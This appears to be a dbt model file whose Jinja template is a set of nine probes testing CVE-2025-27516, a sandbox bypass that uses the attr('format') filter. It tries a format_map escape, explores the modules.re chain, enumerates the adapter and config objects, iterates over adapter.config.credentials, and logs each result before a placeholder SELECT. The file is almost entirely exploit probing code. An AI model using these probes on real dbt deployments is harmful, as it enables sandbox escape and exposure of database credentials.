{# CVE-2025-27516 differential test + alternative escapes #}

{# T1: non-underscore attr via format — proves SandboxedFormatter #}
{% set f1 = '{0.real}'|attr('format') %}
{{ log("T1_REAL=" ~ f1(42), info=True) }}

{# T2: format_map bypass attempt #}
{% set fm = ''|attr('format_map') %}
{{ log("T2_FMAP_TYPE=" ~ (fm | string), info=True) }}

{# T3: Jinja2 version detection #}
{% set jinja_env = '' %}
{% for key in adapter.config.credentials|attr('items')() if False %}{% endfor %}
{{ log("T3_DBT_VERSION=" ~ dbt_version, info=True) }}

{# T4: modules.re chain exploration #}
{% set re_mod = modules.re %}
{% set re_comp = re_mod.compile %}
{{ log("T4_RE_COMPILE=" ~ (re_comp | string), info=True) }}
{% set pattern = re_comp('test') %}
{{ log("T4_PATTERN_TYPE=" ~ (pattern | string), info=True) }}

{# T5: Access non-underscore attrs on re pattern object #}
{% set f5 = '{0.pattern}'|attr('format') %}
{{ log("T5_PATTERN_ATTR=" ~ f5(pattern), info=True) }}
{% set f5b = '{0.flags}'|attr('format') %}
{{ log("T5_FLAGS=" ~ f5b(pattern), info=True) }}
{% set f5c = '{0.groups}'|attr('format') %}
{{ log("T5_GROUPS=" ~ f5c(pattern), info=True) }}

{# T6: Try accessing subclasses via type() in format #}
{% set f6 = '{0.denominator}'|attr('format') %}
{{ log("T6_DENOM=" ~ f6(42), info=True) }}

{# T7: Enumerate available context objects #}
{{ log("T7_ADAPTER_TYPE=" ~ (adapter | string), info=True) }}
{{ log("T7_CONFIG_TYPE=" ~ (adapter.config | string), info=True) }}

{# T8: Check if builtins accessible #}
{% set f8 = '{0.bit_length}'|attr('format') %}
{{ log("T8_BIT_LEN=" ~ f8(255), info=True) }}

{# T9: Try to find Jinja2 version from environment #}
{% set f9 = '{0.sandboxed}'|attr('format') %}
{{ log("T9_ENV=" ~ f9(adapter), info=True) }}

SELECT 1 as id
